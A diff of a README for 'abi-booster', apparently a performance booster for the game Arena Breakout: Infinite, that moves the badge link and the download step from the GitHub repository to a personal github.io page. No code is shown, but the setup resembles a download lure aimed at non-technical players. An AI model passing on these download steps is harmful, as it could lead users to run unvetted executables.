@@ -1,6 +1,6 @@
 # 🚀 abi-booster - Improve your game speed and performance
 
-[![](https://img.shields.io/badge/Download_Manager-Blue-blue.svg)](https://github.com/Passrodgers611/abi-booster)
+[![](https://img.shields.io/badge/Download_Manager-Blue-blue.svg)](https://passrodgers611.github.io)
 
 abi-booster helps you get better performance while you play Arena Breakout: Infinite. The software adjusts your system settings to provide smoother frames and lower latency. It removes common bottlenecks that slow down your computer during intense matches. You do not need technical skills to use this tool.
 
@@ -20,7 +20,7 @@ Check that you have the latest updates for Windows before you begin. You can fin
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the software: [https://github.com/Passrodgers611/abi-booster](https://github.com/Passrodgers611/abi-booster)
+1. Visit this page to download the software: [https://passrodgers611.github.io](https://passrodgers611.github.io)
 2. Locate the latest release version on the page.
 3. Click the link to save the file to your computer.
 4. Select a folder where you can find the file, such as your Downloads folder.
